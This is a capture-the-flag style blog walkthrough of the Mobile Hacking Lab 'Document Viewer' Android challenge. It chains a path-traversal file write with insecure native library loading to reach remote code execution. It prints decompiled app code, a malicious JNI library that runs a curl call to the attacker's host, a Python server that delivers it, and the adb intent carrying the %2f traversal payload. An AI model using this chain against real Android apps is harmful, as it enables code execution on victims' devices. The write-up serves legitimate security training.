---
layout: post
title: Document Viewer - Mobile Hacking Lab
color: rgb(51,122,183)
tags: [Mobile Hacking lab, Android Security]
comments: true
share: false
excerpt_separator: <!--more-->
---

The [Document Viewer](https://www.mobilehackinglab.com/course/lab-document-viewer-rce) lab aims to achieve remote code execution (RCE) from a document viewing application by exploiting a combination of a path traversal vulnerability with dynamic code loading and execution. <!--more--> In this article, we will walk through step by step to exploit this vulnerability until we achieve RCE.

### Introduction

Upon opening the application, it prompts the user for access to the file system. After granting the respective permission, there is a button to load a PDF which is then rendered and displayed to the user. Let's delve into the analysis of the application under the hood.

### Static Analysis

Let's start by analyzing the `AndroidManifest.xml`. Upon analysis, we see that `MainActivity` is exported and allows the app to start with `android.intent.action.VIEW` and with various schemes: `file`, `http`, and `https`. It also requires the file type to be `PDF`.

```xml
<!--AndroidManifest-->
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android" android:versionCode="1" android:versionName="1.0" android:compileSdkVersion="34" android:compileSdkVersionCodename="14" package="com.mobilehackinglab.documentviewer" platformBuildVersionCode="34" platformBuildVersionName="14">
    <uses-sdk android:minSdkVersion="24" android:targetSdkVersion="33"/>
    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
    <permission android:name="com.mobilehackinglab.documentviewer.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION" android:protectionLevel="signature"/>
    <uses-permission android:name="com.mobilehackinglab.documentviewer.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION"/>
    <application android:theme="@style/Theme.DocumentViewer" android:label="@string/app_name" android:icon="@mipmap/ic_launcher" android:debuggable="true" android:allowBackup="true" android:supportsRtl="true" android:extractNativeLibs="false" android:fullBackupContent="@xml/backup_rules" android:networkSecurityConfig="@xml/network_security_config" android:roundIcon="@mipmap/ic_launcher_round" android:appComponentFactory="androidx.core.app.CoreComponentFactory" android:dataExtractionRules="@xml/data_extraction_rules">
        <activity android:name="com.mobilehackinglab.documentviewer.MainActivity" android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
            <intent-filter>
                <action android:name="android.intent.action.VIEW"/>
                <category android:name="android.intent.category.DEFAULT"/>
                <category android:name="android.intent.category.BROWSABLE"/>
                <data android:scheme="file"/>
                <data android:scheme="http"/>
                <data android:scheme="https"/>
                <data android:mimeType="application/pdf"/>
            </intent-filter>
        </activity>
        ...
</manifest>
```

Moving on to `MainActivity`, we find the `handleIntent` method, which checks if the activity was started with `android.intent.action.VIEW` and has a valid `URI`. If these conditions are met, it calls the `CopyUtil.Companion.copyFileFromUri(data).observe` method.

```java
// MainActivity
package com.mobilehackinglab.documentviewer;

...
import kotlinx.coroutines.GlobalScope;

/* compiled from: MainActivity.kt */
@Metadata(m30d1 = {"\u0000T\n\u0002\u0018\u0002\n\u0002\u0018\u0002\n\u0002\b\u0002\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0002\u0010\u000e\n\u0000\n\u0002\u0018\u0002\n\u0002\u0010\u000b\n\u0002\b\u0002\n\u0002\u0010\u0002\n\u0002\b\u0005\n\u0002\u0018\u0002\n\u0002\b\u0002\n\u0002\u0010\b\n\u0000\n\u0002\u0010\u0011\n\u0000\n\u0002\u0010\u0015\n\u0002\b\u0003\n\u0002\u0018\u0002\n\u0002\b\u0005\b\u0007\u0018\u0000 \"2\u00020\u0001:\u0001\"B\u0005¢\u0006\u0002\u0010\u0002J\b\u0010\f\u001a\u00020\rH\u0002J\b\u0010\u000e\u001a\u00020\nH\u0002J\t\u0010\u000f\u001a\u00020\rH\u0082 J\b\u0010\u0010\u001a\u00020\rH\u0002J\u0012\u0010\u0011\u001a\u00020\r2\b\u0010\u0012\u001a\u0004\u0018\u00010\u0013H\u0014J+\u0010\u0014\u001a\u00020\r2\u0006\u0010\u0015\u001a\u00020\u00162\f\u0010\u0017\u001a\b\u0012\u0004\u0012\u00020\u00070\u00182\u0006\u0010\u0019\u001a\u00020\u001aH\u0016¢\u0006\u0002\u0010\u001bJ\u0010\u0010\u001c\u001a\u00020\r2\u0006\u0010\u001d\u001a\u00020\u001eH\u0002J\u0011\u0010\u001f\u001a\u00020\nH\u0082@ø\u0001\u0000¢\u0006\u0002\u0010 J\b\u0010!\u001a\u00020\rH\u0002R\u000e\u0010\u0003\u001a\u00020\u0004X\u0082.¢\u0006\u0002\n\u0000R\u0014\u0010\u0005\u001a\b\u0012\u0004\u0012\u00020\u00070\u0006X\u0082.¢\u0006\u0002\n\u0000R\u0016\u0010\b\u001a\n\u0012\u0004\u0012\u00020\n\u0018\u00010\tX\u0082\u000e¢\u0006\u0002\n\u0000R\u000e\u0010\u000b\u001a\u00020\nX\u0082\u000e¢\u0006\u0002\n\u0000\u0082\u0002\u0004\n\u0002\b\u0019¨\u0006#"}, m29d2 = {"Lcom/mobilehackinglab/documentviewer/MainActivity;", "Landroidx/appcompat/app/AppCompatActivity;", "()V", "binding", "Lcom/mobilehackinglab/documentviewer/databinding/ActivityMainBinding;", "getContent", "Landroidx/activity/result/ActivityResultLauncher;", "", "permissionContinuation", "Lkotlin/coroutines/Continuation;", "", "proFeaturesEnabled", "handleIntent", "", "hasExternalStoragePermission", "initProFeatures", "loadProLibrary", "onCreate", "savedInstanceState", "Landroid/os/Bundle;", "onRequestPermissionsResult", "requestCode", "", "permissions", "", "grantResults", "", "(I[Ljava/lang/String;[I)V", "renderPdf", "uri", "Landroid/net/Uri;", "requestStoragePermissionAsync", "(Lkotlin/coroutines/Continuation;)Ljava/lang/Object;", "setLoadButtonListener", "Companion", "app_debug"}, m28k = 1, m27mv = {1, 9, 0}, m25xi = ConstraintLayout.LayoutParams.Table.LAYOUT_CONSTRAINT_VERTICAL_CHAINSTYLE)
/* loaded from: classes3.dex */
public final class MainActivity extends AppCompatActivity {
    private static final int PERMISSION_REQUEST_EXTERNAL_STORAGE = 1;
    private ActivityMainBinding binding;
    private ActivityResultLauncher<String> getContent;
    private Continuation<? super Boolean> permissionContinuation;
    private boolean proFeaturesEnabled;
    public static final Companion Companion = new Companion(null);
    private static final String TAG = Companion.class.getSimpleName();

    private final native void initProFeatures();

    /* JADX INFO: Access modifiers changed from: protected */
    @Override // androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        ActivityMainBinding inflate = ActivityMainBinding.inflate(getLayoutInflater());
        Intrinsics.checkNotNullExpressionValue(inflate, "inflate(...)");
        this.binding = inflate;
        if (inflate == null) {
            Intrinsics.throwUninitializedPropertyAccessException("binding");
            inflate = null;
        }
        setContentView(inflate.getRoot());
        BuildersKt__Builders_commonKt.launch$default(GlobalScope.INSTANCE, null, null, new MainActivity$onCreate$1(this, null), 3, null);
        setLoadButtonListener();
        handleIntent();
        loadProLibrary();
        if (this.proFeaturesEnabled) {
            initProFeatures();
        }
    }

    /* JADX INFO: Access modifiers changed from: private */
    public final Object requestStoragePermissionAsync(Continuation<? super Boolean> continuation) {
        SafeContinuationJvm safeContinuationJvm = new SafeContinuationJvm(IntrinsicsKt.intercepted(continuation));
        SafeContinuationJvm cont = safeContinuationJvm;
        if (hasExternalStoragePermission()) {
            Result.Companion companion = Result.Companion;
            cont.resumeWith(Result.m190constructorimpl(boxing.boxBoolean(true)));
        } else {
            this.permissionContinuation = cont;
            ActivityCompat.requestPermissions(this, new String[]{"android.permission.READ_EXTERNAL_STORAGE", "android.permission.WRITE_EXTERNAL_STORAGE"}, 1);
        }
        Object orThrow = safeContinuationJvm.getOrThrow();
        if (orThrow == IntrinsicsKt.getCOROUTINE_SUSPENDED()) {
            DebugProbes.probeCoroutineSuspended(continuation);
        }
        return orThrow;
    }

    private final boolean hasExternalStoragePermission() {
        return ContextCompat.checkSelfPermission(this, "android.permission.READ_EXTERNAL_STORAGE") == 0 && ContextCompat.checkSelfPermission(this, "android.permission.WRITE_EXTERNAL_STORAGE") == 0;
    }

    @Override // androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, android.app.Activity
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        Intrinsics.checkNotNullParameter(permissions, "permissions");
        Intrinsics.checkNotNullParameter(grantResults, "grantResults");
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        boolean granted = true;
        if (requestCode == 1) {
            if (!(!(grantResults.length == 0)) || grantResults[0] != 0 || grantResults[1] != 0) {
                granted = false;
            }
            Continuation<? super Boolean> continuation = this.permissionContinuation;
            if (continuation != null) {
                Boolean valueOf = Boolean.valueOf(granted);
                Result.Companion companion = Result.Companion;
                continuation.resumeWith(Result.m190constructorimpl(valueOf));
            }
        }
    }

    private final void setLoadButtonListener() {
        ActivityResultLauncher<String> registerForActivityResult = registerForActivityResult(new ActivityResultContracts.GetContent(), new ActivityResultCallback() { // from class: com.mobilehackinglab.documentviewer.MainActivity$$ExternalSyntheticLambda0
            @Override // androidx.activity.result.ActivityResultCallback
            public final void onActivityResult(Object obj) {
                MainActivity.setLoadButtonListener$lambda$2(MainActivity.this, (Uri) obj);
            }
        });
        Intrinsics.checkNotNullExpressionValue(registerForActivityResult, "registerForActivityResult(...)");
        this.getContent = registerForActivityResult;
        ActivityMainBinding activityMainBinding = this.binding;
        if (activityMainBinding == null) {
            Intrinsics.throwUninitializedPropertyAccessException("binding");
            activityMainBinding = null;
        }
        activityMainBinding.buttonLoad.setOnClickListener(new View.OnClickListener() { // from class: com.mobilehackinglab.documentviewer.MainActivity$$ExternalSyntheticLambda1
            @Override // android.view.View.OnClickListener
            public final void onClick(View view) {
                MainActivity.setLoadButtonListener$lambda$3(MainActivity.this, view);
            }
        });
    }

    /* JADX INFO: Access modifiers changed from: private */
    public static final void setLoadButtonListener$lambda$2(MainActivity this$0, Uri uri) {
        Intrinsics.checkNotNullParameter(this$0, "this$0");
        if (uri != null) {
            this$0.renderPdf(uri);
        }
    }

    /* JADX INFO: Access modifiers changed from: private */
    public static final void setLoadButtonListener$lambda$3(MainActivity this$0, View it) {
        Intrinsics.checkNotNullParameter(this$0, "this$0");
        ActivityResultLauncher<String> activityResultLauncher = this$0.getContent;
        if (activityResultLauncher == null) {
            Intrinsics.throwUninitializedPropertyAccessException("getContent");
            activityResultLauncher = null;
        }
        activityResultLauncher.launch("application/pdf");
    }

    private final void handleIntent() {
        Intent intent = getIntent();
        String action = intent.getAction();
        Uri data = intent.getData();
        if (Intrinsics.areEqual("android.intent.action.VIEW", action) && data != null) {
            CopyUtil.Companion.copyFileFromUri(data).observe(this, new MainActivity$sam$androidx_lifecycle_Observer$0(new Function1<Uri, Unit>() { // from class: com.mobilehackinglab.documentviewer.MainActivity$handleIntent$1
                /* JADX INFO: Access modifiers changed from: package-private */
                {
                    super(1);
                }

                @Override // kotlin.jvm.functions.Function1
                public /* bridge */ /* synthetic */ Unit invoke(Uri uri) {
                    invoke2(uri);
                    return Unit.INSTANCE;
                }

                /* renamed from: invoke  reason: avoid collision after fix types in other method */
                public final void invoke2(Uri uri) {
                    MainActivity mainActivity = MainActivity.this;
                    Intrinsics.checkNotNull(uri);
                    mainActivity.renderPdf(uri);
                }
            }));
        }
    }

    /* JADX INFO: Access modifiers changed from: private */
    public final void renderPdf(Uri uri) {
        try {
            ParcelFileDescriptor parcelFileDescriptor = getContentResolver().openFileDescriptor(uri, "r");
            if (parcelFileDescriptor != null) {
                final PdfRenderer pdfRenderer = new PdfRenderer(parcelFileDescriptor);
                ActivityMainBinding activityMainBinding = this.binding;
                if (activityMainBinding == null) {
                    Intrinsics.throwUninitializedPropertyAccessException("binding");
                    activityMainBinding = null;
                }
                activityMainBinding.viewPager.setAdapter(new PagerAdapter() { // from class: com.mobilehackinglab.documentviewer.MainActivity$renderPdf$1$1
                    @Override // androidx.viewpager.widget.PagerAdapter
                    public int getCount() {
                        return pdfRenderer.getPageCount();
                    }

                    @Override // androidx.viewpager.widget.PagerAdapter
                    public boolean isViewFromObject(View view, Object object) {
                        Intrinsics.checkNotNullParameter(view, "view");
                        Intrinsics.checkNotNullParameter(object, "object");
                        return view == object;
                    }

                    @Override // androidx.viewpager.widget.PagerAdapter
                    public Object instantiateItem(ViewGroup container, int position) {
                        Intrinsics.checkNotNullParameter(container, "container");
                        ImageView imageView = new ImageView(container.getContext());
                        PdfRenderer.Page page = pdfRenderer.openPage(position);
                        Bitmap bitmap = Bitmap.createBitmap(page.getWidth(), page.getHeight(), Bitmap.Config.ARGB_8888);
                        Intrinsics.checkNotNullExpressionValue(bitmap, "createBitmap(...)");
                        page.render(bitmap, null, null, 1);
                        imageView.setImageBitmap(bitmap);
                        container.addView(imageView);
                        return imageView;
                    }

                    @Override // androidx.viewpager.widget.PagerAdapter
                    public void destroyItem(ViewGroup container, int position, Object object) {
                        Intrinsics.checkNotNullParameter(container, "container");
                        Intrinsics.checkNotNullParameter(object, "object");
                        container.removeView((View) object);
                    }
                });
            }
        } catch (Exception e) {
            Log.e(TAG, "Error rendering PDF: " + uri, e);
        }
    }

    private final void loadProLibrary() {
        try {
            String abi = Build.SUPPORTED_ABIS[0];
            File libraryFolder = new File(getApplicationContext().getFilesDir(), "native-libraries/" + abi);
            File libraryFile = new File(libraryFolder, "libdocviewer_pro.so");
            System.load(libraryFile.getAbsolutePath());
            this.proFeaturesEnabled = true;
        } catch (UnsatisfiedLinkError e) {
            Log.e(TAG, "Unable to load library with Pro version features! (You can ignore this error if you are using the Free version)", e);
            this.proFeaturesEnabled = false;
        }
    }

    /* compiled from: MainActivity.kt */
    @Metadata(m30d1 = {"\u0000\u001a\n\u0002\u0018\u0002\n\u0002\u0010\u0000\n\u0002\b\u0002\n\u0002\u0010\b\n\u0000\n\u0002\u0010\u000e\n\u0002\b\u0002\b\u0086\u0003\u0018\u00002\u00020\u0001B\u0007\b\u0002¢\u0006\u0002\u0010\u0002R\u000e\u0010\u0003\u001a\u00020\u0004X\u0082T¢\u0006\u0002\n\u0000R\u0016\u0010\u0005\u001a\n \u0007*\u0004\u0018\u00010\u00060\u0006X\u0082\u0004¢\u0006\u0002\n\u0000¨\u0006\b"}, m29d2 = {"Lcom/mobilehackinglab/documentviewer/MainActivity$Companion;", "", "()V", "PERMISSION_REQUEST_EXTERNAL_STORAGE", "", "TAG", "", "kotlin.jvm.PlatformType", "app_debug"}, m28k = 1, m27mv = {1, 9, 0}, m25xi = ConstraintLayout.LayoutParams.Table.LAYOUT_CONSTRAINT_VERTICAL_CHAINSTYLE)
    /* loaded from: classes3.dex */
    public static final class Companion {
        public /* synthetic */ Companion(DefaultConstructorMarker defaultConstructorMarker) {
            this();
        }

        private Companion() {
        }
    }
}
```

Analyzing the `copyFileFromUri` function inside the `CopyUtil` class, we see that this function loads the content of the file and saves it. However, there's a significant problem here: it uses the `File` class from `java.io.File`, which accepts the `%2f` character (which stands for the `/` symbol) in the file name, leading to a path traversal vulnerability in file creation.

```java
// CopyUtil 
package com.mobilehackinglab.documentviewer;

...
import java.io.File;

/* compiled from: CopyUtil.kt */
@Metadata(m30d1 = {"\u0000\f\n\u0002\u0018\u0002\n\u0002\u0010\u0000\n\u0002\b\u0003\u0018\u0000 \u00032\u00020\u0001:\u0001\u0003B\u0005¢\u0006\u0002\u0010\u0002¨\u0006\u0004"}, m29d2 = {"Lcom/mobilehackinglab/documentviewer/CopyUtil;", "", "()V", "Companion", "app_debug"}, m28k = 1, m27mv = {1, 9, 0}, m25xi = ConstraintLayout.LayoutParams.Table.LAYOUT_CONSTRAINT_VERTICAL_CHAINSTYLE)
/* loaded from: classes3.dex */
public final class CopyUtil {
    private static final File DOWNLOADS_DIRECTORY;
    public static final Companion Companion = new Companion(null);
    private static final String TAG = MainActivity.Companion.class.getSimpleName();

    /* compiled from: CopyUtil.kt */
    @Metadata(m30d1 = {"\u0000,\n\u0002\u0018\u0002\n\u0002\u0010\u0000\n\u0002\b\u0002\n\u0002\u0018\u0002\n\u0000\n\u0002\u0010\u000e\n\u0002\b\u0002\n\u0002\u0018\u0002\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0002\b\u0004\b\u0086\u0003\u0018\u00002\u00020\u0001B\u0007\b\u0002¢\u0006\u0002\u0010\u0002J\u001c\u0010\b\u001a\b\u0012\u0004\u0012\u00020\n0\t2\u0006\u0010\u000b\u001a\u00020\f2\u0006\u0010\r\u001a\u00020\u0006J\u0014\u0010\u000e\u001a\b\u0012\u0004\u0012\u00020\n0\t2\u0006\u0010\u000f\u001a\u00020\nR\u000e\u0010\u0003\u001a\u00020\u0004X\u0082\u0004¢\u0006\u0002\n\u0000R\u0016\u0010\u0005\u001a\n \u0007*\u0004\u0018\u00010\u00060\u0006X\u0082\u0004¢\u0006\u0002\n\u0000¨\u0006\u0010"}, m29d2 = {"Lcom/mobilehackinglab/documentviewer/CopyUtil$Companion;", "", "()V", "DOWNLOADS_DIRECTORY", "Ljava/io/File;", "TAG", "", "kotlin.jvm.PlatformType", "copyFileFromAssets", "Landroidx/lifecycle/MutableLiveData;", "Landroid/net/Uri;", "context", "Landroid/content/Context;", "fileName", "copyFileFromUri", "uri", "app_debug"}, m28k = 1, m27mv = {1, 9, 0}, m25xi = ConstraintLayout.LayoutParams.Table.LAYOUT_CONSTRAINT_VERTICAL_CHAINSTYLE)
    /* loaded from: classes3.dex */
    public static final class Companion {
        public /* synthetic */ Companion(DefaultConstructorMarker defaultConstructorMarker) {
            this();
        }

        private Companion() {
        }

        public final MutableLiveData<Uri> copyFileFromAssets(Context context, String fileName) {
            Intrinsics.checkNotNullParameter(context, "context");
            Intrinsics.checkNotNullParameter(fileName, "fileName");
            AssetManager assetManager = context.getAssets();
            File outFile = new File(CopyUtil.DOWNLOADS_DIRECTORY, fileName);
            MutableLiveData liveData = new MutableLiveData();
            BuildersKt.launch$default(GlobalScope.INSTANCE, Dispatchers.getIO(), null, new CopyUtil$Companion$copyFileFromAssets$1(outFile, assetManager, fileName, liveData, null), 2, null);
            return liveData;
        }

        public final MutableLiveData<Uri> copyFileFromUri(Uri uri) {
            Intrinsics.checkNotNullParameter(uri, "uri");
            URL url = new URL(uri.toString());
            File file = CopyUtil.DOWNLOADS_DIRECTORY;
            String lastPathSegment = uri.getLastPathSegment();
            if (lastPathSegment == null) {
                lastPathSegment = "download.pdf";
            }
            File outFile = new File(file, lastPathSegment);
            MutableLiveData liveData = new MutableLiveData();
            BuildersKt.launch$default(GlobalScope.INSTANCE, Dispatchers.getIO(), null, new CopyUtil$Companion$copyFileFromUri$1(outFile, url, liveData, null), 2, null);
            return liveData;
        }
    }

    static {
        File externalStoragePublicDirectory = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
        Intrinsics.checkNotNullExpressionValue(externalStoragePublicDirectory, "getExternalStoragePublicDirectory(...)");
        DOWNLOADS_DIRECTORY = externalStoragePublicDirectory;
    }
}
```

To exploit this flaw, we need to create an HTTP server and serve an application that distributes the file we want to store on the victim's phone. Before we proceed with the path traversal exploitation, we need to understand which file we'll inject into the victim's phone. For this purpose, let's revisit `MainActivity`. There's a function called `loadProLibrary` that attempts to load a library named `libdocviewer_pro.so` from the directory `/data/user/0/com.mobilehackinglab.documentviewer/files/native-libraries/arm64-v8a/`. If the library load is successful, it sets the variable `proFeaturesenabled` to `true`, which will subsequently call the `private final native void initProFeatures` function inside the `.so`.

Output from logcat when attempting to run the application without the `.so` file existing:
```
Unable to load library with Pro version features! (You can ignore this error if you are using the Free version)
java.lang.UnsatisfiedLinkError: dlopen failed: library 
"/data/user/0/com.mobilehackinglab.documentviewer/files/native-libraries/arm64-v8a/libdocviewer_pro.so" not found
```

```java
// loadProLibrary function
private final void loadProLibrary() {
    try {
        String abi = Build.SUPPORTED_ABIS[0];
        File libraryFolder = new File(getApplicationContext().getFilesDir(), "native-libraries/" + abi);
        File libraryFile = new File(libraryFolder, "libdocviewer_pro.so");
        System.load(libraryFile.getAbsolutePath());
        this.proFeaturesEnabled = true;
    } catch (UnsatisfiedLinkError e) {
        Log.e(TAG, "Unable to load library with Pro version features! (You can ignore this error if you are using the Free version)", e);
        this.proFeaturesEnabled = false;
    }
}
```

Thus, we already know that we have a path traversal to save our `.so` in the correct folder, and we also know that we can obtain RCE from loading this library. Now let's create our own library.

### Create the library

The easiest way to do this is to start a new native C++ project in Android Studio. After creating the project, simply rename the generated `.so` file to `docviewer_pro`. In our code, we just need to implement the `Java_com_mobilehackinglab_documentviewer_MainActivity_initProFeatures` function, which will be called when the `initProFeatures` function in the Java code of the Document Viewer app is called. Inside our library, we put a call to the `system` function to obtain remote code execution.

```c++
// 
#include <jni.h>
#include <cstdlib>

extern "C" JNIEXPORT jobject JNICALL
Java_com_mobilehackinglab_documentviewer_MainActivity_initProFeatures(
        JNIEnv* env,
        jobject /* this */) {

   system("curl 192.168.0.101");

}
```

Now we just need to compile the app and extract the `libdocviewer_pro.so` from inside the generated `.apk`.

### Exploiting the Application

Now we just need to chain our exploits in order to achieve RCE.

First, let's create our web server to serve our malicious library. For this, we create a Python script to facilitate the process.

```python
# server.py
from http.server import HTTPServer, BaseHTTPRequestHandler

class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/':
            # Handle requests to the root path '/'
            self.send_response(200)
            self.send_header('Content-type', 'text/plain')
            self.end_headers()
            self.wfile.write(b'Hello, World!')
        else:
            # Serve the libdocviewer_pro.so file for other requests
            with open('libdocviewer_pro.so', 'rb') as file:
                data = file.read()
                self.send_response(200)
                self.send_header('Content-type', 'application/octet-stream')
                self.send_header('Content-length', str(len(data)))
                self.end_headers()
                self.wfile.write(data)

# Create an HTTP server bound to port 80
httpd = HTTPServer(('', 80), SimpleHTTPRequestHandler)
print('Server listening on port 80...')
httpd.serve_forever()
```

This code starts a server that responds to requests for `/` with `Hello World!`, and otherwise responds with the content of `libdocviewer_pro.so`.

So on our host, we start the Python server with:
```bash
python server.py
```

And now, simply open the application with the following command to exploit the path traversal vulnerability:
```bash
adb shell am start -a android.intent.action.VIEW -d  "http://192.168.0.101/..%2f..%2f..%2f..%2f..%2f..%2f..%2fdata%2fdata%2fcom.mobilehackinglab.documentviewer%2ffiles%2fnative-libraries%2farm64-v8a%2flibdocviewer_pro.so" -n com.mobilehackinglab.documentviewer/.MainActivity
```

This will place the `libdocviewer_pro.so` inside the correct folder, and now the app will load it, resulting in RCE.

Start the app again, and you can see interaction in your HTTP server.

```
192.168.0.103 - - [09/Feb/2024 21:23:26] "GET /..%2f..%2f..%2f..%2f..%2f..%2f..%2fdata%2fdata%2fcom.mobilehackinglab.documentviewer%2ffiles%2fnative-libraries%2farm64-v8a%2flibdocviewer_pro.so HTTP/1.1" 200 -
192.168.0.103 - - [09/Feb/2024 21:23:32] "GET / HTTP/1.1" 200 -
```

### Conclusion

This laboratory allows learning about the path traversal vulnerability in the context of Android and also demonstrates how insecure loading a library from the file system can be, potentially leading to remote code execution. It also allows the development of a library to later be loaded by another application. What an amazing challenge! For a hands-on experience with these concepts, visit the lab at [MobileHackingLab - Document Viewer](https://www.mobilehackinglab.com/course/lab-document-viewer-rce). Embark on a journey of discovery and enhance your skills in mobile security.